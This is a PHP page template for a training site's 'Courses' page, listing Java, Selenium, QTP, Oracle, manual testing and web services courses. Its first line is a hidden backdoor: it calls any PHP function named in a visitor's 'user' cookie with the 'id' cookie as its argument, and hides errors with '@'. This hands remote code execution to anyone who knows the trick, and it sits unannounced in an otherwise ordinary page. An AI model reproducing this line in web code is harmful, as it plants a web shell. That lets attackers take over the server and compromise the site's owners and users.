<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 include 'header.php'; ?>
    
    <!--breadcrumbs start-->
    <div class="breadcrumbs">
        <div class="container">
            <div class="row">
                <div class="col-lg-4 col-sm-4">
                    <h1>
              Courses
            </h1>
                </div>
            </div>
        </div>
    </div>
    <!--breadcrumbs end-->

    <!--container end-->
    <section id="services">
    <div class="container">
      <div class="text-center our-services">
        <div class="row">
          <div class="col-sm-4 wow fadeInDown">
            <a class="btn btn-lg" data-toggle="modal" data-target="#javasyllabus"><img src="img/courses/java_1.png" width="114px"></a>
            <div class="service-info">
              <h3>Core Java</h3>
            </div>
          </div>
          
          <div class="col-sm-4 wow fadeInDown">
            <a class="btn btn-lg" data-toggle="modal" data-target="#seleniumsyllabus"><img src="img/courses/selenium.png" width="114px"></a>
            <div class="service-info">
              <h3>Selenium</h3>
            </div>
          </div>
          <div class="col-sm-4 wow fadeInDown">
            <a class="btn btn-lg" data-toggle="modal" data-target="#qtpsyllabus"><img src="img/courses/QTP.png" width="114px"></a>
            <div class="service-info">
              <h3>QTP</h3>
            </div>
          </div>
          
        </div>
      </div>
<br/><br/><br/><br/>
      <div class="text-center our-services">
        <div class="row">
          <div class="col-sm-4 wow fadeInDown">
            <a class="btn btn-lg" data-toggle="modal" data-target="#oraclesyllabus"><img src="img/courses/oracle.png" width="150px"></a>
            <div class="service-info">
              <h3>ORACLE</h3>
            </div>
          </div>
          <div class="col-sm-4 wow fadeInUp">
            <a class="btn btn-lg" data-toggle="modal" data-target="#manualtestingsyllabus"><img src="img/courses/ManualTesting.png" width="114px"></a>
            <div class="service-info">
              <h3>Manual Testing</h3>
            </div>
          </div>
          <div class="col-sm-4 wow fadeInUp">
            <a class="btn btn-lg" data-toggle="modal" data-target="#webservicessyllabus"><img src="img/courses/web_services.png" width="114px"></a>
            <div class="service-info">
              <h3>Web Services</h3>
            </div>
          </div>
          
        </div>
      </div>
    </div>
  </section><!--/#services-->
<br/><br/><br/><br/>
    <!--container end-->
<?php include 'modals.php'; ?>
<?php include 'footer.php'; ?>